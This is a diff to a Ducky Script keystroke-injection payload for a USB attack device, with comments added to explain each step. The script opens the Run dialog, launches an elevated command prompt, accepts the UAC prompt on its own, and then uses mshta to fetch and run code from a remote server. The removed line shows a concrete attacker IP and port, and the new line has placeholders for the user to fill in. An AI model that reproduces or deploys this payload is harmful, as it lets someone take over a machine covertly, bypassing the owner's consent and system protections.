@@ -1,13 +1,18 @@
 DELAY 1000
+REM GUI is the windows key in this instance and will use the short cut to open the run window
 GUI r
 DELAY 300
+REM this is what will be typed in the run window, first it will call powershell to run cmd prompt as an admin.
 STRING powershell Start-Process cmd -Verb runAs
 DELAY 400
+REM This is the shortcut where it will run the  run window as an admin
 CTRL-SHIFT ENTER
 DELAY 3000
+REM This will permit the window to run as an admin
 ALT y
 DELAY 4000
-STRING mshta http://192.168.0.20:9999/mish
+REM Change the things in the brackets such as your IP address and the port it will communicate through. The subdomain is able to make it unique to only your server (Note that this command will be ran in cmd prompt)
+STRING mshta http://[0.0.0.0]:[PORT]/[anything]
 ENTER
 STRING exit
 ENTER
